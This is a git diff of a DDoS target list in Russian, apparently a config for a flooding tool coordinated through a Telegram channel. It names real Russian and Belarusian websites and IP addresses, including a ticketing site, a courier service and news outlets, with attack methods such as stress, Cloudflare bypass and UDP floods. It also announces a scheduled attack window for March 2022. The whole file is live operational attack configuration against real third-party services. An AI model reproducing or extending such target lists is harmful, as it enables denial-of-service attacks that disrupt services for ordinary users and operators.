@@ -1,32 +1,12 @@
 ### Цели можно комментировать. Ставить вначале "#" чтобы они становились временно не активными.
 ### Цели выбираются и анонсируются в канале Украинский Жнец - https://t.me/+-GoGtA_IsOk3YmE6 чат - https://t.me/+sNy3N3b11_9mMDA6
 
-# Цели на 19.03 
-#https://carte.by/source/front/api.js https://carte.by/minsk/hpl/export/ https://carte.by/vitebsk/dostavka/ 193.176.182.165:80 193.176.182.165:443 tcp://193.176.182.165:80 tcp://193.176.182.165:443 --http-methods post get stress
-#https://www.politnavigator.news/ http://www.politnavigator.news/ --http-methods cfb
-#https://rusvesna.su/ http://rusvesna.su/ --http-methods cfb
-#95.131.27.119:80 95.131.27.119:443 --http-methods get stress
-#https://tsargrad.tv/ http://tsargrad.tv/ --http-methods bypass cfb dgb
-#https://bitrix24.by/ https://bitrix24.by/ 185.183.120.132:80 185.183.120.132:443 46.235.53.117:80 46.235.53.117:443 tcp://185.183.120.132:80 tcp://185.183.120.132:443 tcp://46.235.53.117:80 tcp://46.235.53.117:443 --http-methods stress bypass get dgb cfb 
-#http://shop.mts.ru https://shop.mts.ru 178.248.232.150:80 178.248.232.150:443 https://178.248.232.150:443 tcp://178.248.232.150:80 tcp://178.248.232.150:443 --http-methods bypass dgb cfb stress
-#udp://92.223.100.53:53 udp://92.223.77.53:53 --http-methods UDP
-#https://ati.su/ http://ati.su/ --http-methods stress
-#tcp://139.45.252.51:80 tcp://139.45.252.51:443 tcp://139.45.252.52:80 tcp://139.45.252.52:443 --http-methods stress
-
-#https://groozgo.ru/ 
-#tcp://178.57.75.119:443
-# testing
-#http://77.223.102.17 --http-methods get
-#https://dstat.imagehub.host --http-methods cfb
 
 
-https://cdek.ru/ http://cdek.ru/ --http-methods get stress head
-http://78.46.28.63:80 http://78.46.28.63:443 --http-methods stress head
-#udp://82.202.192.244:123
+#Следующая цель https://poezda.biletyplus.ru - будем бить минимум до 12:00 (22.03.2022) 
 
-https://vezetvsem.ru/ https://frontend.vezetvsem.ru/ 89.108.106.50:80 89.108.106.50:443 https://89.108.106.50:443 tcp://89.108.106.50:22 tcp://89.108.106.50:80 tcp://89.108.106.50:443 --http-methods get stress head bypass
+https://poezda.biletyplus.ru http://poezda.biletyplus.ru --http-methods bypass stress
 
-#https://groozgo.ru/ http://groozgo.ru/ 188.114.96.3:80 188.114.96.3:8080 188.114.96.3:443 188.114.96.3:8443 188.114.97.2:80 188.114.97.2:443 https://188.114.97.2:443 188.114.97.2:8080 https://188.114.97.2:8443 188.114.96.2:80 188.114.96.2:443 188.114.96.2:8443 https://188.114.96.2:443 https://188.114.96.2:8443 --http-methods cfb cfbuam
-#188.114.96.2:80 188.114.96.2:8080 188.114.96.2:443 https://188.114.96.2:443 https://188.114.96.2:8443 104.21.19.217:80 104.21.19.217:443 104.21.19.217:8080 https://104.21.19.217:443 https://104.21.19.217:8443 --http-methods stress get head cfb
+http://5.53.120.162 https://5.53.120.162 http://5.53.120.163 https://5.53.120.163 htts://95.213.206.234 --http-methods stress
 
-#https://178.57.75.119:443 --http-methods stress 
+tcp://5.53.120.162:443 tcp://5.53.120.163:443 tcp://95.213.206.234:443
